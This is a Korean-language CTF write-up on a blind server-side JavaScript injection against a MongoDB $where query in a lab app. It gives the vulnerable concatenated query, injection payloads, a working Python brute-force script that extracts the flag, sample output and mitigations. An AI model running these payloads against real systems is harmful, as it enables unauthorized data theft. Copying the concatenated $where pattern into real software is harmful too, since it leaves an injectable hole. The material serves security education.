+++
title = "VulnABLE CTF [LUXORA]: NoSQL Injection 🥇 Gold (SSJS Injection)"
description = "LUXORA 플랫폼의 Server-Side JavaScript(SSJS) Injection을 이용한 NoSQL 데이터 탈취 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "NoSQL Injection", "Gold", "SSJS"]
+++

# VulnABLE CTF [LUXORA]: NoSQL Injection 🥇 Gold

NoSQL(특히 MongoDB)의 강력함 이면에는 위험한 기능이 숨어 있습니다. 바로 데이터베이스 내부에서 자바스크립트 코드를 실행할 수 있는 `$where` 연산자입니다.

이번 Gold 난이도 `/nosqli/gold` 라우트에서는 입력값 검증(Type, Regex)이 모두 완벽하게 되어 있지만, 로직 자체의 결함을 파고드는 **SSJS (Server-Side JavaScript) Injection** 기법을 다루어보겠습니다.

---

## 🕒 1. 타겟 탐색 및 $where 연산자 발견 (Reconnaissance)

`/nosqli/gold` 페이지는 상품의 할인 코드를 입력받는 페이지입니다.
URL: `GET /nosqli/gold?code=SALE50`

힌트나 소스코드 유출을 통해 백엔드 쿼리가 다음과 같이 작성되어 있음을 유추/확인했습니다.
```javascript
// 백엔드 취약 코드 구조
db.coupons.find({ $where: "this.code == '" + req.query.code + "'" })
```

**[해커의 사고 과정]**
* `$where` 연산자는 MongoDB 엔진 안에서 자바스크립트를 `eval()`처럼 실행시키는 아주 위험한 문법이다.
* 문자열 병합(`+ req.query.code +`)으로 코드가 들어가고 있으니, 기존의 SQL Injection처럼 홑따옴표(`'`)를 닫고 내가 원하는 자바스크립트 논리를 주입할 수 있겠군!

---

## 🕒 2. SSJS 페이로드 설계 (Exploitation)

목표는 할인 코드를 몰라도 `true`를 반환하게 만들거나, 다른 민감한 정보(플래그)를 뽑아내는 것입니다.

### 💡 공격 원리: 자바스크립트 논리 조작
기본 실행 코드: `this.code == '[입력값]'`

입력값에 `1' || '1'=='1` 을 넣는다면?
실행 코드: `this.code == '1' || '1'=='1'`
-> 이것은 자바스크립트 관점에서 항상 참(True)입니다!

### 🚀 데이터 추출을 위한 블라인드 페이로드
단순히 참을 만드는 것을 넘어, 데이터베이스 안에 있는 `flag` 필드를 찾아 한 글자씩 빼내야 합니다. 자바스크립트 함수를 자유롭게 쓸 수 있으므로 다음과 같이 공격합니다.

```javascript
// 플래그의 첫 글자가 'F'인지 확인하는 페이로드
1' || this.flag.match(/^F/) || '1'=='0
```

이 값이 쿼리에 들어가면:
`this.code == '1' || this.flag.match(/^F/) || '1'=='0'`

플래그가 F로 시작한다면 전체 코드가 `true`가 되어 할인 쿠폰이 적용되었다는 메시지가 뜰 것입니다!

---

## 🕒 3. 공격 수행 및 자동화 스크립트 작성

수동으로 한 글자씩 찾을 수도 있지만, 파이썬 스크립트를 작성하여 빠르게 플래그를 추출합니다.

```python
import requests
import string

url = "http://localhost:3000/nosqli/gold"
chars = string.ascii_letters + string.digits + "{}_"
flag = "^"

print("Starting SSJS Blind Injection...")
while True:
    for c in chars:
        # SSJS Injection 페이로드
        payload = f"1' || this.flag.match(/{flag + c}/) || '1'=='0"
        res = requests.get(f"{url}?code={payload}")
        
        if "Coupon Applied!" in res.text:
            flag += c
            print(f"Found: {flag.replace('^', '')}")
            break
            
    if flag.endswith("}"):
        break

print(f"Final Flag: {flag.replace('^', '')}")
```

### 🔍 공격 결과
```text
Starting SSJS Blind Injection...
Found: F
Found: FL
Found: FLA
...
Found: FLAG{NOSQL_🥇_SSJS_EVAL_C9F3D2}
Final Flag: FLAG{NOSQL_🥇_SSJS_EVAL_C9F3D2}
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{NOSQL_🥇_SSJS_EVAL_C9F3D2}`

### 📝 왜 이런 공격이 성공했는가?
MongoDB의 `$where` 연산자는 매우 강력하지만 그만큼 위험합니다. 개발자가 편리함(동적 조건 검색)을 위해 문자열 결합 방식으로 클라이언트의 입력을 그대로 자바스크립트 컨텍스트에 밀어 넣었기 때문에, SQL Injection과 완전히 동일한 원리로 코드가 조작된 것입니다.

### 🛡️ 방어 대책 (Mitigation)
1. **$where 연산자 사용 금지**: 최신 MongoDB 환경에서는 성능과 보안상의 이유로 `$where` 사용을 극도로 제한합니다. 대부분의 로직은 `$expr`이나 일반 쿼리 연산자로 대체 가능합니다.
2. **MongoDB 설정에서 자바스크립트 실행 차단**: 데이터베이스 설정 파일(`mongod.conf`)에서 `javascriptEnabled: false` 옵션을 주어 서버 사이드 자바스크립트 실행 자체를 물리적으로 막는 것이 가장 안전합니다.

지금까지 NoSQL Injection 시리즈를 마쳤습니다. 다음은 시스템을 직접 장악할 수 있는 **Command Injection 카테고리**로 넘어가 보겠습니다!